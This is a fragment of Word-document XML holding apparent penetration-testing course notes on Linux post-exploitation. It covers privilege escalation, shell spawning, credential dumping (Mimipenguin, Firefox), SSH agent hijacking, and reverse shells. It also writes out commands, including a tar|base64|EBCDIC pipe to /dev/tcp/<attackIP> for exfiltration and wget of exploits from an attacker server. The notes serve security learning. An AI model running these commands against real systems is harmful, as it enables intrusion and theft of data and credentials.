    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000057F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2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with an exec switch </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000580">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2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Python to spawn shell, python -c ‘import pty; pty.spawn(“/bin/sh”)’</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000581">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2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Perl to spawn shell; perl -e ‘exec “/bin/sh”;’</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000582">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="20"/>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Ssh connection with shell command on switch , b4 restricted shell can be initialised</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000583">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="20"/>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58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8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Passwords</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000058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Mimipenguin -- dump clear text credentials from memory of; GDM Password, Gnome Keyring,openssh,apache2 etc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000058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Swap memory -- passwords in swap files</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000058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pwanwd0eqly" w:id="195"/>
        <w:bookmarkEnd w:id="19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4. Code Execution via Shared Object library Loading</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000058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Similar to DLLS,  .so files (shared object)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000058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called from the outside an application via an  .so file or .a files (static library compiled into an application)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000058B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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There is a Search order</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000058C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="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-rpath-link → -rpath → ENV Variables LD_RUN_PATH → /lib  or /usr/lib → /etc/ld.so.conf</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000058D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>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shared objects being used with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ldd /path/exec</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000058E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="720" w:hanging="360"/>
        <w:rPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:rFonts w:ascii="Oswald" w:cs="Oswald" w:eastAsia="Oswald" w:hAnsi="Oswald"/>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Can be compiled with RPATH or RUN PATH, find which one</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000058F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="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 to vulnerable location and create payload</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000590">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="1"/>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Msfvenom, handler</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000591">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Execute with user with higher privs, cron job</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000592">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vi35d77gmfx6" w:id="196"/>
        <w:bookmarkEnd w:id="19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5.Kernel Exploits</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000059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Outdated kernels</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000059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 Kernel examples</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000595">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13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Dirty cow - race condition on the copy on write breakage private read-only memory mappings</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000596">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="133"/>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Unpriv user could use flaw to gain write access to read-only memory mapping</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000597">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13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Stack clash</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000598">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="133"/>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Dccp double dree priv</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000599">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="133"/>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Race condition priv</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000059A">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5uockbtib67e" w:id="197"/>
        <w:bookmarkEnd w:id="197"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000059B">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xmvyiw25syw" w:id="198"/>
        <w:bookmarkEnd w:id="19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Discovery</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000059C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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Searchsploit “linux kernel debian”</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000059D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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Linux_exploit_suggeste ( github)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000059E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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Uname -a </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000059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May need to compile with, gcc exploit.c -o exploit </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005A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Make executable, chmod +x exploit</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005A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metasploit</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005A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A3">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62oxd8q2r6t4" w:id="199"/>
        <w:bookmarkEnd w:id="19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Lateral Movement</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005A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uy6p0oerek6" w:id="200"/>
        <w:bookmarkEnd w:id="20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SSH Hijacking </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005A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Needs to have active SSH session established to another machine via Public Key Authentication</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005A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If root on compromised system → compromise ssh agent / access ssh agent unix domain socket THEN hijack the connection</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005A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Because ssh-agent creates a socket and listens for conn from the sshd daemon </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005A8">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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ssh process id </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005A9">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="1440" w:hanging="360"/>
        <w:rPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:rFonts w:ascii="Oswald" w:cs="Oswald" w:eastAsia="Oswald" w:hAnsi="Oswald"/>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Ps aux | grep sshd</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005AA">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Find domain socket </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005AB">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="1440" w:hanging="360"/>
        <w:rPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:rFonts w:ascii="Oswald" w:cs="Oswald" w:eastAsia="Oswald" w:hAnsi="Oswald"/>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Grep SSH_AUTH_SOCK /proc/&lt;IDFOUND&gt;/environ</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005AC">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Hijack the connection</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005AD">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="1440" w:hanging="360"/>
        <w:rPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:rFonts w:ascii="Oswald" w:cs="Oswald" w:eastAsia="Oswald" w:hAnsi="Oswald"/>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SSH_AUTH_SOCK=/tmp/ssh-xxxx/agent.xxx ssh-add -l</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005AE">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Login</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005A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B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rvzjwi6q53n" w:id="201"/>
        <w:bookmarkEnd w:id="20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Stealing SSH Credentials</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005B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Sending ssh credentials to your server </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005B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sshLooter</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005B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B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lu9t8r8oft7" w:id="202"/>
        <w:bookmarkEnd w:id="20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Dump Firefox saved cred</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005B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/home/user/.mozilla/firefox/#####.default</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005B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Firefoxy_decrypt.py</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005B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B8">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9m1jggsbr07" w:id="203"/>
        <w:bookmarkEnd w:id="20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 Exfiltration </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005B9">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7cjuhns1x8cr" w:id="204"/>
        <w:bookmarkEnd w:id="20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Exfil over TCP Socket with EBCDIC and Base64</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005B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TCP socket on target system → netcat listener  to receive data</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005BB">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>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Encode data with base64 and EBCDIC encoding to obfuscate</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005BC">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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Configure nc listener on attacker machine (redirect output to file)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005BD">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="104"/>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Nc -nlvp 80 &gt; datafolder.tmp</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005BE">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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the target, tar folder to stdout (-), encode with BASE64 and EBCDIC and redirect over TCP socket</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005BF">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="104"/>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Tar zcf - /tmp/datafolder |base64 | dd conv=ebcdic &gt; dev/tcp/&lt;attackIP&gt;/80</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005C0">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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Decode (dd conv) and extract </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005C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C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n5lr5v1jzcc1" w:id="205"/>
        <w:bookmarkEnd w:id="20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Exfil over SSH</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005C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Tar contents and ssh over to attack machine</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005C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C5">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6xukdv8cxkmf" w:id="206"/>
        <w:bookmarkEnd w:id="20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Maintaining access and Persistence</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005C6">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xs7zryxeqir" w:id="207"/>
        <w:bookmarkEnd w:id="20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Reverse Shells</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005C7">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vgmxko37uys" w:id="208"/>
        <w:bookmarkEnd w:id="20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Reverse tcp payload</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005C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C9">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bfk0cpu5hw2" w:id="209"/>
        <w:bookmarkEnd w:id="20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Open ssl client with mkfifo named pipes</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005CA">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="20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Pipe → creates a names instance (file) of a series of commands which can be referenced and redirected output to and from the named pipe</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005CB">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="78"/>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Create open ssl certificate key pair for listener → key.pem, cert.pem</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005CC">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="78"/>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Start listener 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attack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machine → openssl s_server with pem keys</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005CD">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="78"/>
        </w:numPr>
        <w:spacing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target</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create mkfifo named pipe (x in /tmp) WITH an openssl s_client to connect back to attacker</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005C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CF">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s42z7yh53xt" w:id="210"/>
        <w:bookmarkEnd w:id="21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ICMP Reverse Shell</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005D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Icmpsh</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005D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Reverse shells using icmp packets</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005D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D3">
      <w:pPr>
        <w:pStyle w:val="Heading5"/>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fmmr2hazoul" w:id="211"/>
        <w:bookmarkEnd w:id="21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Staged V Stageless</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005D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Stageless → larger in size, include payload within binary, rather than being pushed to the target after a connection is established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have _ in metasploit)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005D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D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Bind Shell → attacker to a target port , greeted with a shell\</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005D7">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k2l0d123wleo" w:id="212"/>
        <w:bookmarkEnd w:id="21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@VIDEO (PostExploitation and Lateral Movement)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005D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D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Udev exploit kernel vulnerability</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005DA">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Uname -a  ← check kernel version</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005DB">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exploit db etc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005DC">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Dpkg -l | grep udev</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005DD">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attacker python -m  simplehttpsserver 80 </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005DE">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On victim wget Http://url /filename</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005DF">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gcc is installed → gcc --version</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005E0">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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Gcc exploit -o expecutable_name</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005E1">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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Chmod +x exploit name → make sure executable </w:t>
        </w:r>
      </w:ins>
    </w:p>
